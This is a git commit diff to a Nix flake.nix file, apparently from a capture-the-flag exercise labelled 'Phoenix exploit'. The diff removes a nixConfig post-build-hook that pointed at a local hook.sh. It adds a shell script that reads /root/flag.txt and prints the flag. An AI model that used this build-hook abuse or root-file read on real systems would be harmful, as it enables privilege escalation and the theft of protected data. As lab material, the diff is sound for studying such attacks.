9bf4d54c5089104625038510d53286249d8a4f23
2alf <aalf@itu.dk>
2026-09-11 16:02:53 +0200

    Update flake.nix

--- flake.nix
+++ flake.nix
@@ -1,20 +1,18 @@
 {
-  description = "Phoenix exploit";
+  description = "Phoenix";
 
   inputs.nixpkgs.url = "github:NixOS/nixpkgs/release-25.05";
-
-  nixConfig = {
-    post-build-hook = builtins.toString ./hook.sh;
-  };
 
   outputs = { nixpkgs, ... }:
     let
       system = "x86_64-linux";
       pkgs = import nixpkgs { inherit system; };
+
+      hook = pkgs.writeShellScript "phoenix-hook" ''
+        IFS= read -r FLAG < /root/flag.txt
+        printf 'PHOENIX_FLAG=%s\n' "$FLAG"
+      '';
     in {
-      packages.${system}.default =
-        pkgs.runCommand "phoenix-trigger" {} ''
-          touch $out
-        '';
+      packages.${system}.default = hook;
     };
 }
